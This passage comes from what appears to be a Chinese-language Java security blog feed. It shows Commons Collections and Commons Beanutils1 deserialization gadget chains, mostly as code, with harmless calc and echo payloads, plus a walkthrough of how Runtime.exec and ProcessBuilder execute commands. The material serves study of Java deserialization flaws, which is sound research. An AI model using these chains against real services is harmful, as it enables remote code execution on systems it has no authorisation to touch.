org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, <span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">finalmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        finalmap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有点小问题，就是 debug 的时候会直接弹出计算器<br>原因是展示对象集合，IDEA 会自动调用 <code>toString()</code>  方法，可以在设置中关闭<br><img src="https://img-blog.csdnimg.cn/8a5596b881af44f9a059d9c835b122d3.png" alt="在这里插入图片描述"><br>还有个问题…<br> 在 <code>Map,put()</code>  的时候为了防止直接触发 RCE<br> 这里包装到 <code>map</code>  的参数 <code>chainedTransformer</code>  可以写成其他的<br>在 <code>LazyMap.decorate</code>  的 factory 参数可以写成 <code>new ConstantTransformer(&quot;xxx&quot;)</code>  或 <code>new ConstantTransformer(1)</code></p><p><img src="https://img-blog.csdnimg.cn/aee065b8a34d4564806a179cf7c56c84.png" alt="在这里插入图片描述"></p><p>后面再通过反射调用，修改 <code>factiry</code>  的值为 <code>chainedTransformer</code> <br> 即</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line"> factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> factoryField.set(lazyMapClass, chainedTransformer);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;Java 8u71 以后，sun.reflect.annotation.AnnotationInvocationHandler#readObj</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java命令执行</title>
    <link href="https://ki10moc.github.io/2022/12/23/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://ki10moc.github.io/2022/12/23/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2022-12-23T06:17:36.000Z</published>
    <updated>2023-05-22T07:13:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="windows"><a class="markdownIt-Anchor" href="#windows">#</a> Windows</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span><span class="string">&quot;cmd /c echo 1 &gt; 1.txt&quot;</span>;</span><br><span class="line">            process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;gbk&quot;</span>)));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对执行的 command 判断，非空后进行识别<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513067.png" alt="在这里插入图片描述"><br>其中 <code>StringTokenizer</code>  默认是空格分隔<br>再存入数组<br><img src="https://img-blog.csdnimg.cn/e170a02c319249069a9c3ee81d2d1306.png" alt="在这里插入图片描述"><br>一直到 exec 返回值<br>来看下这三个值的含义<br><img src="https://img-blog.csdnimg.cn/afc62f593e0240c2b63a9a6095c064cc.png" alt="在这里插入图片描述"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513112.png" alt="在这里插入图片描述"></p><p>会发现，其实底层还是使用 <code>ProcessBuilder.start</code>  来执行刚才拿到的 <code>cmdarray</code> <br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513864.png" alt="在这里插入图片描述"></p><p>数组的第一个元素存入 <code>prog</code> ，也就是要执行的命令<br>然后判断 <code>security</code>  是否为空，是则继续进行，否则调用 <code>SecurityManager.checkExec</code>  检验 <code>prog</code> <br> 执行的命令不能是空格开头，否则会抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// Must convert to array first -- a malicious user-supplied</span></span><br><span class="line">        <span class="comment">// list might try to circumvent the security check.</span></span><br><span class="line">        String[] cmdarray = command.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[command.size()]);</span><br><span class="line">        cmdarray = cmdarray.clone();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String arg : cmdarray)</span><br><span class="line">            <span class="keyword">if</span> (arg == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="comment">// Throws IndexOutOfBoundsException if command is empty</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">prog</span> <span class="operator">=</span> cmdarray[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>)</span><br><span class="line">            security.checkExec(prog);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> directory == <span class="literal">null</span> ? <span class="literal">null</span> : directory.toString();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; cmdarray.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cmdarray[i].indexOf(<span class="string">&#x27;\u0000&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;invalid null character in command&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ProcessImpl.start(cmdarray,</span><br><span class="line">                                     environment,</span><br><span class="line">                                     dir,</span><br><span class="line">                                     redirects,</span><br><span class="line">                                     redirectErrorStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">exceptionInfo</span> <span class="operator">=</span> <span class="string">&quot;: &quot;</span> + e.getMessage();</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e;</span><br><span class="line">            <span class="keyword">if</span> ((e <span class="keyword">instanceof</span> IOException) &amp;&amp; security != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Can not disclose the fail reason for read-protected files.</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    security.checkRead(prog);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                    exceptionInfo = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    cause = se;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// It&#x27;s much easier for us to create a high-quality error</span></span><br><span class="line">            <span class="comment">// message than the low-level C code which found the problem.</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(</span><br><span class="line">                <span class="string">&quot;Cannot run program \&quot;&quot;</span> + prog + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">                + (dir == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : <span class="string">&quot; (in directory \&quot;&quot;</span> + dir + <span class="string">&quot;\&quot;)&quot;</span>)</span><br><span class="line">                + exceptionInfo,</span><br><span class="line">                cause);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在执行的命令前加上 <code>cmd /c</code>  实际上是告诉计算机此时的环境变量</p><h3 id="linux"><a class="markdownIt-Anchor" href="#linux">#</a> Linux</h3><p><code>ProcessBuilder</code>  下的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构建一个具有指定操作系统和参数的进程构建器。</span></span><br><span class="line"><span class="comment">     * 系统程序和参数。 这是一个方便的</span></span><br><span class="line"><span class="comment">     * 构建器，它将进程构建器的命令设置为一个字符串</span></span><br><span class="line"><span class="comment">     * 包含与&#123;<span class="doctag">@code</span> command&#125;相同的字符串的列表。</span></span><br><span class="line"><span class="comment">     * 数组，顺序相同。 它并不检查是否</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> command&#125;是否对应于一个有效的操作系统</span></span><br><span class="line"><span class="comment">     * 命令。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> command 一个包含程序及其参数的字符串数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.command = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(command.length);</span><br><span class="line">        <span class="keyword">for</span> (String arg : command)</span><br><span class="line">            <span class="built_in">this</span>.command.add(arg);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果传入参数是字符串数组，参数不会被 <code>StringTokenizer</code>  影响</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeExec</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 111 &gt; 3.txt&quot;</span>&#125;;</span><br><span class="line">            process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;gbk&quot;</span>)));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;windows&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#windows&quot;&gt;#&lt;/a&gt; Windows&lt;/h3&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Commons Beanutils1</title>
    <link href="https://ki10moc.github.io/2022/11/23/Commons%20Beanutils1/"/>
    <id>https://ki10moc.github.io/2022/11/23/Commons%20Beanutils1/</id>
    <published>2022-11-22T17:28:36.000Z</published>
    <updated>2023-07-15T13:07:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="apache-commons-beanutils"><a class="markdownIt-Anchor" href="#apache-commons-beanutils">#</a> Apache Commons Beanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通 Java 类对<br>象（也称为 JavaBean）的一些操作方法。</p><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包含私有属性 <code>name</code> ，两个方法，一个读取一个设置<br> <code>getxxx</code> -&gt; <code>getter</code> ， <code>setxxx</code> -&gt; <code>setter</code> ，全名符合骆驼式命名法</p><p>其中 <code>commons-beanutils</code>  中提供了一个静态方法  <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任<br>意 JavaBean 的 getter 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Cat</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>commons-beanutils</code>  还会自动调用 <code>name</code>  属性的 <code>getter</code>  方法。<br> <code>PropertyUtils.getProperty</code>  还支持递归获取属性<br>例如 <code>a</code>  对象中有 <code>b</code>  属性， <code>b</code>  中有 <code>c</code> ，那就可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code>  递归获取对象。</p><p>来看下 <code>org.apache.commons.beanutils.BeanComparator</code>  下的 <code>compare</code>  方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( T o1, T o2 )</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">            <span class="comment">// compare the actual objects</span></span><br><span class="line">            <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">            <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513089.png" alt="在这里插入图片描述"></p><p>而 <code>TemplatesImpl#newTransformer()</code>  的上一层调用方法 <code>getOutputProperties()</code>  是 <code>get</code>  开头，符合 <code>getter</code> <br> 定义</p><p>对<a href="https://blog.csdn.net/m0_52367015/article/details/126101980?spm=1001.2014.3001.5501"> TemplatesImpl</a> 忘记流程的可以看下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ki10MOc;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//TemplatesImpl部分</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\Code\\JavaSecurityCode\\CommonsBeanutils1\\target\\classes\\evil\\EvilTemplatesImpl.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,</span><br><span class="line">                comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//setFieldValue利用反射给私有变量赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> 